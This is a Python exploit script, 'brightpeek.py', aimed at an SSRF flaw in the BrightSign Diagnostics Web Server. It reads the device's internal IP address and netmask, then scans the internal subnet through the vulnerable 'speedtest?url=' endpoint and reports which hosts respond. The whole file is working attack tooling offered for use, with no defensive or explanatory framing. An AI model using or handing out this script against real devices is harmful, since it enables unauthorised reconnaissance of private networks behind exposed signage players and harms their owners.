#!/usr/bin/env python3
'''
    For probing internal network through BrightSign device SSRF in BrightSign Diagnostics Web Server
    Slow but steady :)
    Usage:
    ./brightpeek.py DEVICE_ADDRESS:DEVICE_PORT_NUMBER
'''

import sys
import requests
import ipaddress

VULN_ENDPOINT = 'speedtest?url='
INFO_ENDPOINT = 'netconfig.html?ref=diagnostics.html'
IP_LINE = '<b>Current IP:</b> '
NET_LINE = '<b>Netmask:</b> '
TEST_PORTS = {1337}

ext_ip = None
ext_port = None

result_list = []
def print_results():
    print("Hosts located in scan:")
    for ip in result_list:
        print(f"{ip}")

def print_help():
    print("Usage:\nbrightpeek.py DEVICE_ADDRESS:DEVICE_PORT_NUMBER\n")

def check_args(args):
    global ext_ip
    global ext_port
    
    if (len(args) < 2):
        return 1

    if (len(args) > 2):
        print("Too many arguments")
        return 1

    if (len(args[1].split(':')) != 2):
        print("Invalid syntax")
        return 1
    
    ext_ip = args[1].split(':')[0]
    ext_port = 0

    try:
        ext_port = int(sys.argv[1].split(':')[1])
        if (ext_port < 0 or ext_port > 65535):
            raise Exception
    except Exception:
        print("Port needs to be a number in range: 0 - 65535")
        return 1
      
    return 0

def main(args):
    if check_args(args):
        print_help()
        exit(1)

    # Set up request specifics
    req_base = f"http://{ext_ip}:{ext_port}"
    req_headers = {
        'Host': ext_ip + ':' + str(ext_port),
        'User-Agent': 'Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0',   # for the lulz
        'Access-Control-Allow-Origin': '*',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cookie': 'language=en; updateTips=true; enableAnonymous8888=false; enableAnonymous9988=false',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }

    # Get internal IP address of BrightSign device
    info_req = requests.get(f"{req_base}/{INFO_ENDPOINT}", headers=req_headers)
    info_split = info_req.content.split(b'\n')

    int_ip = None
    int_netmask = None

    for line in info_split:
        if IP_LINE in line.decode('utf-8'):
            int_ip = line.decode('utf-8').strip(IP_LINE).strip()
        if NET_LINE in line.decode('utf-8'):
            int_netmask = line.decode('utf-8').strip(NET_LINE).strip()

    if int_ip == '':
        print("Could not get internal IP address.")
        exit(1)
    if int_netmask == '':
        print("Could not get internal network address.")
        exit(1)

    # Get network of BrightSign device
    try:
        int_net = ipaddress.IPv4Network((int_ip, int_netmask), strict=False)
    except:
        print("Something went wrong. :( Could not calculate network CIDR.")
        exit(1)
        
    print(f"External:           {ext_ip}:{ext_port}")
    print(f"Internal IP:        {int_ip}")
    print(f"Internal Network:   {int_net}")

    #Iterate through IP range
    print("Scanning (this may take a while)...")
    
    global result_list

    for ip in ipaddress.ip_network(int_net).hosts():
        for port in TEST_PORTS:
            print(f"Probing Host: {ip}:{port}", end='\r')
            req_string = f"{req_base}/{VULN_ENDPOINT}{ip}:{port}"
            response = None

            try:
                response = requests.get(req_string, headers=req_headers)
            except Exception as e:
                print(f"Could not complete request. : {e}")
                exit(1)
                
            if 'No route to host' not in response.text.strip():
                print("\r", end='')
                print(f"Hit: {ip}:{port} <-> {response.text.strip()}")

                result_list.append(ip)

if __name__ == '__main__':
    try:
        main(sys.argv)
    except KeyboardInterrupt:
        print("\n\nCtrl-C pressed, exiting.")
        print_results()
    
    print("Done.")
    